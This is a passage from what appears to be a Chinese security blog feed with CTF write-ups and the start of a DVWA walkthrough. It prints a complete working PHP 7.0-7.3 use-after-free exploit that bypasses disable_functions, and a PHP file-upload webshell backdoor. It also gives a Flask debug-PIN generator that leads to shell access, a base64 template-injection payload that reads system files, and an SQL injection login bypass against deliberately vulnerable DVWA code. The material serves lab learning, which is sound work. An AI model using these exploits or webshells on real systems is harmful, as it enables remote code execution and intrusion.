class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9IA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">9:devices:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320</span><br></pre></td></tr></table></figure><blockquote><p>docker环境，读取/etc/machine-id 是错误的</p></blockquote><p><strong>获取MAC地址</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line">02:42:ac:12:00:06</span><br><span class="line"># 注意mac地址要转成十进制: 2485377957894</span><br></pre></td></tr></table></figure><p><strong>获取用户名</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">flaskweb:x:1000:1000::&#x2F;home&#x2F;flaskweb:</span><br></pre></td></tr></table></figure><p><strong>报错得到flask app的路径</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</span><br></pre></td></tr></table></figure><p>通过大佬的脚本计算PIN码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本出处：https://xz.aliyun.com/t/2553</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377957894&#x27;</span>,<span class="comment"># mac address,需要转成十进制</span></span><br><span class="line">    <span class="string">&#x27;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320&#x27;</span><span class="comment"># machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>得到PIN码，刚才报错的位置，输入PIN码，正确即可进入一个python的shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python flask-PIN.py</span><br><span class="line">103-824-476</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/02/25/9u6iAn7eqayw21W.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print(os.popen(&#39;ls &#x2F;&#39;).read())</span><br><span class="line">...</span><br><span class="line">this_is_the_flag.txt</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; flag &#x3D; os.popen(&#39;cat &#x2F;this_is_the_flag.txt&#39;).read()</span><br><span class="line">&gt;&gt;&gt; print(flag)</span><br><span class="line">flag&#123;93df69f0-3005-414f-a119-c5562af1b167&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>非预期</p><p>因为<code>/runtime/session/</code>存在目录遍历，加之题目没有做docker容器，导致可以看其他选手的payload，在这个目录下发现了其他选手存的东西：</p><p><img src="https://i.loli.net/2020/02/25/kHFnqSGICh4LgDY.png"></p><p><strong>预期解</strong></p><p>考察<a href="https://paper.seebug.org/1114/">TP6任意文件操作漏洞</a></p><blockquote><p>由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell。</p></blockquote><p>进入网站，登录后，有一个搜索功能，会将个人搜索记录以序列化的方式存到以session命名的文件中。</p><p>因为存在上述漏洞，可以任意写入文件，这里直接写一句话，发现不行。用<code>phpinfo()</code>查看禁用函数。</p><p><img src="https://i.loli.net/2020/02/25/B15Kbfl6wMQR3rn.png"></p><p>用<code>scandir(&#39;/&#39;)</code>发现根目录，有一个<code>flag</code>和一个<code>readflag</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; flag [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; readflag [16] &#x3D;&gt; root [17] &#x3D;&gt; run [18] &#x3D;&gt; sbin [19] &#x3D;&gt; srv [20] &#x3D;&gt; start.sh [21] &#x3D;&gt; sys [22] &#x3D;&gt; tmp [23] &#x3D;&gt; usr [24] &#x3D;&gt; var ) &quot;;&#125;</span><br></pre></td></tr></table></figure><p>尝试用php的文件读取函数直接读<code>flag</code>，发现没有权限<code>Permission denied </code>。</p><p>推测需要通过绕过禁用函数，RCE执行<code>readflag</code>读取<code>flag</code>。</p><p>找了一个大佬的脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><p>利用这个<strong>GC的特定析构函数free后使用导致的漏洞</strong><a href="https://bugs.php.net/bug.php?id=72530"><strong>Use After Free in GC with Certain Destructors</strong></a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//这里是想要执行的系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是因为题目的搜索有长度限制，并不能直接把这么长的脚本保存到session的php文件里，需要先传一个php小马，再用小马上传这个<code>bypass</code>脚本。这是我找的一个小马：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if(@$_GET[&quot;act&quot;]&#x3D;&#x3D;&quot;save&quot;)&#123;if(isset($_POST[&quot;content&quot;])&amp;&amp;isset($_POST[&quot;name&quot;]))&#123;if($_POST[&quot;content&quot;]!&#x3D;&quot;&quot;&amp;&amp;$_POST[&quot;name&quot;]!&#x3D;&quot;&quot;)&#123;if(fwrite(fopen(stripslashes($_POST[&quot;name&quot;]),&quot;w&quot;),stripslashes($_POST[&quot;content&quot;])))&#123;echo &quot;OK! &lt;a href&#x3D;\&quot;&quot;.stripslashes($_POST[&quot;name&quot;]).&quot;\&quot;&gt;&quot;.stripslashes($_POST[&quot;name&quot;]).&quot;&lt;&#x2F;a&gt;&quot;;&#125;;&#125;&#125;&#125;else&#123;if(@$_GET[&quot;act&quot;]&#x3D;&#x3D;&quot;godsdoor&quot;)&#123;echo &#39;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;form action&#x3D;&quot;?act&#x3D;save&quot; method&#x3D;&quot;post&quot;&gt;content:&lt;br&#x2F;&gt;&lt;textarea name&#x3D;&quot;content&quot; &gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;filenane:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;name&quot;&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;GO!&quot;&gt;&lt;&#x2F;form&gt;&#39;;&#125;&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F; ?act&#x3D;godsdoor</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/02/25/v6P75cmJGpabOjl.png"></p><p>将上面的<code>bypass.php</code>上传到这个目录，访问上传的文件就可以RCE了。</p><p><img src="https://i.loli.net/2020/02/25/PqzkIJErRKdm3UT.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Day1&quot;&gt;&lt;a href=&quot;#Day1&quot; class=&quot;headerlink&quot; title=&quot;Day1&quot;&gt;&lt;/a&gt;Day1&lt;/h1&gt;&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;we</summary>
      
    
    
    
    <category term="CTF" scheme="v0w.top/categories/CTF/"/>
    
    
    <category term="反序列化" scheme="v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="SQL注入" scheme="v0w.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="文件上传" scheme="v0w.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>DVWA全级别漏洞复现</title>
    <link href="v0w.top/2020/01/05/DVWA-all_in_one/"/>
    <id>v0w.top/2020/01/05/DVWA-all_in_one/</id>
    <published>2020-01-04T16:00:00.000Z</published>
    <updated>2020-07-18T10:36:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考研大半年没碰安全方面，考完研，想重新拾起网络安全方面的知识，想起来重新复现一遍DVWA，新的一年，希望能温故知新。另一方面，新版的<code>dvwa1.9</code>新增了几个新模块，博主之前未分析过，也学习一下分享一下。</p><h1 id="BruteForce（暴力破解）"><a href="#BruteForce（暴力破解）" class="headerlink" title="BruteForce（暴力破解）"></a>BruteForce（暴力破解）</h1><p>很熟悉了，直接看代码吧。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get username</span></span><br><span class="line">$user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get password</span></span><br><span class="line">$pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">// Get users details</span></span><br><span class="line">$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Login successful</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">$html .= <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Login failed</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到第3行，只验证了参数Login知否设置，没有防爆破方法，参数username和password都是没有任何过滤，直接拼接的，还存在明显的SQL注入漏洞。</p><p><strong>漏洞利用</strong></p><p><strong>方法 1 暴力破解</strong></p><p><img src="https://i.loli.net/2020/02/27/9O5TMPLaI7dnjou.png"></p><p><strong>方法2 SQl注入</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin &#39;# &amp;password&#x3D;1</span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" 